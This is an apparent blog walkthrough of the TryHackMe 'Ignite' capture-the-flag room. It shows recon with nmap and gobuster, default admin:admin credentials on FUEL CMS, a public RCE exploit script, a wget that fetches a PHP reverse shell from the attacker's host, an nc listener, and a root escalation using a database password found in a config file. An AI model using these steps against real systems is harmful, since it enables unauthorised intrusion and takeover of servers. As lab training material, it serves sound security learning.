<!DOCTYPE html>
<html class="dark" lang=" en"><head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>TryHackMe - Ignite | Akymos.io</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="TryHackMe - Ignite" />
<meta name="author" content="Akymos" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="A new start-up has a few issues with their web server." />
<meta property="og:description" content="A new start-up has a few issues with their web server." />
<link rel="canonical" href="https://akymos.io/ctf/2023/05/07/ignite.html" />
<meta property="og:url" content="https://akymos.io/ctf/2023/05/07/ignite.html" />
<meta property="og:site_name" content="Akymos.io" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-05-07T11:58:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="TryHackMe - Ignite" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Akymos"},"dateModified":"2023-05-07T11:58:00+00:00","datePublished":"2023-05-07T11:58:00+00:00","description":"A new start-up has a few issues with their web server.","headline":"TryHackMe - Ignite","mainEntityOfPage":{"@type":"WebPage","@id":"https://akymos.io/ctf/2023/05/07/ignite.html"},"url":"https://akymos.io/ctf/2023/05/07/ignite.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/main.css"><link type="application/atom+xml" rel="alternate" href="https://akymos.io/feed.xml" title="Akymos.io" /><!-- Magnific Popup core CSS file -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.9.1/jquery.min.js" integrity="sha512-jGR1T3dQerLCSm/IGEGbndPwzszJBlKQ5Br9vuB0Pw2iyxOy+7AK+lJcCC8eaXyz/9du+bkCy4HXxByhxkHf+w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js" integrity="sha512-IsNh5E3eYy3tr/JiX2Yx4vsCujtkhwl7SLqgnwLNgf04Hrt9BT9SXlLlZlWx+OK4ndzAoALhsMNcCmkggjZB1w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/flowbite/1.6.5/flowbite.min.js" integrity="sha512-CUU7D5YgLISaFU6CpCXmXG6dZDD7RoYBocHwukyd7SYkFy0p7gP3zXGSLOtJ1bELJnK6aYBg4t7hnl0d8Dk2YA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
</head><body class="flex flex-col min-h-screen"><header>
    <nav>
        <div class="max-w-screen-xl flex flex-wrap items-center justify-between mx-auto p-4">
            <div>
                <h1 class="font-bold leading-tight mt-3 text-3xl text-slate-100 lg:mb-6 lg:text-3xl">
                    <a href="/index.html">Akymos.io</a>
                </h1>
            </div>  
            <button data-collapse-toggle="navbar-default" type="button" class="inline-flex items-center p-2 ml-3 text-sm rounded-lg md:hidden focus:outline-none" aria-controls="navbar-default" aria-expanded="false">
                <span class="sr-only">Open menu</span>
                <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
            </button>
            <div class="hidden w-full md:block md:w-auto" id="navbar-default">
                <ul class="font-medium flex flex-col p-4 md:p-0 mt-4 border rounded-lg  md:flex-row md:space-x-8 md:mt-0 md:border-0">
                    <li>
                        <a href="/ctf/index.html" class="block font-bold md:mt-3 lg:mb-6 lg:text-xl">CTF</a>
                    </li>
                    <li>
                        <a href="/project/index.html" class="block font-bold md:mt-3 lg:mb-6 lg:text-xl">PROJECTS</a>
                    </li>
                    <li>
                        <a href="/about.html" class="block font-bold md:mt-3 lg:mb-6 lg:text-xl">ABOUT</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>
</header><main class="pb-4">
        <div class="flex justify-between px-4 mx-auto max-w-screen-xl ">
            <article class="mx-auto w-full format format-sm sm:format-base lg:format-lg format-invert prose prose-invert lg:prose-xl">
                <header class="mb-4 lg:mb-6 not-format">
    <address class="flex items-center mb-6 not-italic">
        <div class="inline-flex items-center mr-3 text-sm text-white">
            <a href="/about.html">
                <img class="mr-4 w-16 h-16 rounded-full" src="https://github.com/akymos.png" alt="Akymos">
            </a>
            <div>
                <p class="text-base font-light text-gray-400">
                    <time pubdate="2023-05-07 11:58:00 +0000" datetime="2023-05-07 11:58:00 +0000" title="07 May 2023">Published on today</time> by <a href="/about.html" class="text-base font-light text-gray-400">Akymos</a>
                </p>
                <p class="text-base font-light text-gray-400">
                    1 min read
                </p>
                <p class="text-base font-light text-gray-400">
                    
                    <a class="tag ctf" href="/tag/ctf/index.html">ctf</a>
                    
                    <a class="tag tryhackme" href="/tag/tryhackme/index.html">tryhackme</a>
                    
                </p>
            </div>
        </div>
    </address>
    <h1>TryHackMe - Ignite</h1>
</header>

<hr />
<h2>
  
  
    Table of Contents
  
  
</h2>
    
<nav class="toc">
<ul id="markdown-toc">
  <li><a href="#room-info" id="markdown-toc-room-info">Room info</a>    <ul>
      <li><a href="#questions" id="markdown-toc-questions">Questions</a></li>
    </ul>
  </li>
  <li><a href="#step-0---recon" id="markdown-toc-step-0---recon">Step 0 - Recon</a>    <ul>
      <li><a href="#nmap" id="markdown-toc-nmap">Nmap</a></li>
      <li><a href="#gobuster" id="markdown-toc-gobuster">Gobuster</a></li>
    </ul>
  </li>
  <li><a href="#question-1---usertxt" id="markdown-toc-question-1---usertxt">Question 1 - User.txt</a></li>
  <li><a href="#question-2---roottxt" id="markdown-toc-question-2---roottxt">Question 2 - Root.txt</a></li>
</ul>

</nav><hr />

<div class="pb-1"></div>
<h2 id="room-info">
  
  
    <a href="#room-info">#</a> Room info
  
  
</h2>
    
<ul>
  <li><strong>Name</strong>: Ignite</li>
  <li><strong>Link</strong>: <a href="https://tryhackme.com/room/ignite" target="_blank">https://tryhackme.com/room/ignite</a></li>
  <li><strong>Subscription</strong>: Free</li>
  <li><strong>Difficulty</strong>: Easy</li>
  <li><strong>Description</strong>: A new start-up has a few issues with their web server.</li>
</ul>
<h3 id="questions">
  
  
    <a href="#questions">#</a> Questions
  
  
</h3>
    
<ol>
  <li>User.txt</li>
  <li>Root.txt</li>
</ol>
<h2 id="step-0---recon">
  
  
    <a href="#step-0---recon">#</a> Step 0 - Recon
  
  
</h2>
    
<h3 id="nmap">
  
  
    <a href="#nmap">#</a> Nmap
  
  
</h3>
    
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.10.178.117 
Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-05-07 12:03 CEST
Nmap scan report <span class="k">for </span>10.10.178.117 <span class="o">(</span>10.10.178.117<span class="o">)</span>
Host is up <span class="o">(</span>0.043s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 999 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-title: Welcome to FUEL CMS
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>15.28 seconds
</code></pre></div></div>
<h3 id="gobuster">
  
  
    <a href="#gobuster">#</a> Gobuster
  
  
</h3>
    
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt <span class="nt">-u</span> http://10.10.178.117 <span class="nt">-q</span>                
/.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 292]
/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 297]
/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 297]
/0                    <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 16597]
/@                    <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 1134]
/assets               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 315] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.178.117/assets/]
/home                 <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 16597]
/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 16597]
/index                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 16597]
/lost+found           <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 1134]
/offline              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 70]
/robots.txt           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 30]
/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 301]
</code></pre></div></div>
<h2 id="question-1---usertxt">
  
  
    <a href="#question-1---usertxt">#</a> Question 1 - User.txt
  
  
</h2>
    
<p>We can see that the website is running on FUEL CMS 1.4. The homepage is a default installation page. We can see that the admin panel is located at <code class="language-plaintext highlighter-rouge">/fuel</code>.
<img src="/assets/images/ctf-ignite/01.png" alt="Ignite - Fuel index" class="post-image" />
The default credentials are <code class="language-plaintext highlighter-rouge">admin:admin</code>. We can now login to the admin panel but nothing interesting here. 
<img src="/assets/images/ctf-ignite/02.png" alt="Ignite - Fuel admin" class="post-image" /></p>

<p>Let’s search for exploits on FUEL CMS 1.4. We can find a RCE exploit
<a href="https://www.exploit-db.com/exploits/50477" target="_blank">https://www.exploit-db.com/exploits/50477</a></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python 50477.py <span class="nt">-u</span> http://10.10.178.117
<span class="o">[</span>+]Connecting...
Enter Command <span class="nv">$echo</span> <span class="s2">"foo bar"</span> <span class="o">&gt;</span> test.txt  <span class="o">&amp;&amp;</span> <span class="nb">ls</span> <span class="nt">-lha</span>
systemtotal 52K
drwxrwxrwx 4 root     root     4.0K May  7 03:30 <span class="nb">.</span>
drwxr-xr-x 3 root     root     4.0K Jul 26  2019 ..
<span class="nt">-rw-r--r--</span> 1 root     root      163 Jul 26  2019 .htaccess
<span class="nt">-rwxrwxrwx</span> 1 root     root     1.4K Jul 26  2019 README.md
drwxrwxrwx 9 root     root     4.0K Jul 26  2019 assets
<span class="nt">-rwxrwxrwx</span> 1 root     root      193 Jul 26  2019 composer.json
<span class="nt">-rwxrwxrwx</span> 1 root     root     6.4K Jul 26  2019 contributing.md
drwxrwxrwx 9 root     root     4.0K Jul 26  2019 fuel
<span class="nt">-rwxrwxrwx</span> 1 root     root      12K Jul 26  2019 index.php
<span class="nt">-rwxrwxrwx</span> 1 root     root       30 Jul 26  2019 robots.txt
<span class="nt">-rw-r--r--</span> 1 www-data www-data    0 May  7 03:30 test.txt


Enter Command <span class="err">$</span>
</code></pre></div></div>
<p>Nice, we have can write files on the server.
<img src="/assets/images/ctf-ignite/03.png" alt="Ignite - Fuel RCE" class="post-image" /></p>

<p>Let’s upload a reverse shell.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Enter Command <span class="nv">$wget</span> http://10.8.32.129/rs.php <span class="o">&amp;&amp;</span> <span class="nb">ls</span> <span class="nt">-lha</span>
systemtotal 60K
drwxrwxrwx 4 root     root     4.0K May  7 03:33 <span class="nb">.</span>
drwxr-xr-x 3 root     root     4.0K Jul 26  2019 ..
<span class="nt">-rw-r--r--</span> 1 root     root      163 Jul 26  2019 .htaccess
<span class="nt">-rwxrwxrwx</span> 1 root     root     1.4K Jul 26  2019 README.md
drwxrwxrwx 9 root     root     4.0K Jul 26  2019 assets
<span class="nt">-rwxrwxrwx</span> 1 root     root      193 Jul 26  2019 composer.json
<span class="nt">-rwxrwxrwx</span> 1 root     root     6.4K Jul 26  2019 contributing.md
drwxrwxrwx 9 root     root     4.0K Jul 26  2019 fuel
<span class="nt">-rwxrwxrwx</span> 1 root     root      12K Jul 26  2019 index.php
<span class="nt">-rwxrwxrwx</span> 1 root     root       30 Jul 26  2019 robots.txt
<span class="nt">-rw-r--r--</span> 1 www-data www-data 2.6K Apr 16 07:24 rs.php
<span class="nt">-rw-r--r--</span> 1 www-data www-data    8 May  7 03:31 test.txt


Enter Command <span class="err">$</span>
</code></pre></div></div>
<p>And we have a shell.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lnvp</span> 9001           
listening on <span class="o">[</span>any] 9001 ...
connect to <span class="o">[</span>10.8.32.129] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.178.117] 53586
Linux ubuntu 4.15.0-45-generic <span class="c">#48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
 03:33:37 up 35 min,  0 <span class="nb">users</span>,  load average: 0.02, 0.48, 0.71
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
sh: 0: can<span class="s1">'t access tty; job control turned off
</span></code></pre></div></div>
<p>After the stabilisation of the shell, we can find the user flag in the home directory.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/<span class="nv">$ </span><span class="nb">cd</span> /home/www-data/
www-data@ubuntu:/home/www-data<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lha</span>
total 12K
drwx--x--x 2 www-data www-data 4.0K Jul 26  2019 <span class="nb">.</span>
drwxr-xr-x 3 root     root     4.0K Jul 26  2019 ..
<span class="nt">-rw-r--r--</span> 1 root     root       34 Jul 26  2019 flag.txt
www-data@ubuntu:/home/www-data<span class="nv">$ </span><span class="nb">cat </span>flag.txt
</code></pre></div></div>
<h2 id="question-2---roottxt">
  
  
    <a href="#question-2---roottxt">#</a> Question 2 - Root.txt
  
  
</h2>
    
<p>We can try with LinPEAS to find some interesting information, but nothing useful.
We can try to find some SUID binaries, but nothing useful.</p>

<p><em>WE ARE STUCK…</em></p>

<p>After a while, I decided to check the installation / configuration of FUEL CMS, maybe we can find something interesting.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/var/www/html/fuel/application/config<span class="nv">$ </span><span class="nb">tail</span> <span class="nt">-30</span> database.php 
<span class="nv">$active_group</span> <span class="o">=</span> <span class="s1">'default'</span><span class="p">;</span>
<span class="nv">$query_builder</span> <span class="o">=</span> TRUE<span class="p">;</span>

<span class="nv">$db</span><span class="o">[</span><span class="s1">'default'</span><span class="o">]</span> <span class="o">=</span> array<span class="o">(</span>
        <span class="s1">'dsn'</span>   <span class="o">=&gt;</span> <span class="s1">''</span>,
        <span class="s1">'hostname'</span> <span class="o">=&gt;</span> <span class="s1">'localhost'</span>,
        <span class="s1">'username'</span> <span class="o">=&gt;</span> <span class="s1">'root'</span>,
        <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'***********'</span>,
        <span class="s1">'database'</span> <span class="o">=&gt;</span> <span class="s1">'fuel_schema'</span>,
        <span class="s1">'dbdriver'</span> <span class="o">=&gt;</span> <span class="s1">'mysqli'</span>,
        <span class="s1">'dbprefix'</span> <span class="o">=&gt;</span> <span class="s1">''</span>,
        <span class="s1">'pconnect'</span> <span class="o">=&gt;</span> FALSE,
        <span class="s1">'db_debug'</span> <span class="o">=&gt;</span> <span class="o">(</span>ENVIRONMENT <span class="o">!==</span> <span class="s1">'production'</span><span class="o">)</span>,
        <span class="s1">'cache_on'</span> <span class="o">=&gt;</span> FALSE,
        <span class="s1">'cachedir'</span> <span class="o">=&gt;</span> <span class="s1">''</span>,
        <span class="s1">'char_set'</span> <span class="o">=&gt;</span> <span class="s1">'utf8'</span>,
        <span class="s1">'dbcollat'</span> <span class="o">=&gt;</span> <span class="s1">'utf8_general_ci'</span>,
        <span class="s1">'swap_pre'</span> <span class="o">=&gt;</span> <span class="s1">''</span>,
        <span class="s1">'encrypt'</span> <span class="o">=&gt;</span> FALSE,
        <span class="s1">'compress'</span> <span class="o">=&gt;</span> FALSE,
        <span class="s1">'stricton'</span> <span class="o">=&gt;</span> FALSE,
        <span class="s1">'failover'</span> <span class="o">=&gt;</span> array<span class="o">()</span>,
        <span class="s1">'save_queries'</span> <span class="o">=&gt;</span> TRUE
<span class="o">)</span><span class="p">;</span>

// used <span class="k">for </span>testing purposes
<span class="k">if</span> <span class="o">(</span>defined<span class="o">(</span><span class="s1">'TESTING'</span><span class="o">))</span>
<span class="o">{</span>
        @include<span class="o">(</span>TESTER_PATH.<span class="s1">'config/tester_database'</span>.EXT<span class="o">)</span><span class="p">;</span>
<span class="o">}</span>
</code></pre></div></div>
<p>Let’s try to use that password to switch to root.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/var/www/html/fuel/application/config<span class="nv">$ </span>su       
Password: 
root@ubuntu:/var/www/html/fuel/application/config#
</code></pre></div></div>
<p><em>IT WORKS!</em></p>

<p>Let’s find the root flag.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ubuntu:/var/www/html/fuel/application/config# <span class="nb">cat</span> /root/
.bash_history  .cache/        .profile       
.bashrc        .nano/         root.txt       
root@ubuntu:/var/www/html/fuel/application/config# <span class="nb">cat</span> /root/root.txt 
</code></pre></div></div>



            </article>
        </div>
    </main>
    
    <script>
        window.FontAwesomeConfig = {
            searchPseudoElements: true
        }
        $(document).ready(function () {
            $('.post-image').magnificPopup({
                type: 'image',
                callbacks: {
                    elementParse: function (item) {
                        item.src = item.el.attr('src');
                    }
                }
            });
        });
    </script>
</body>

</html>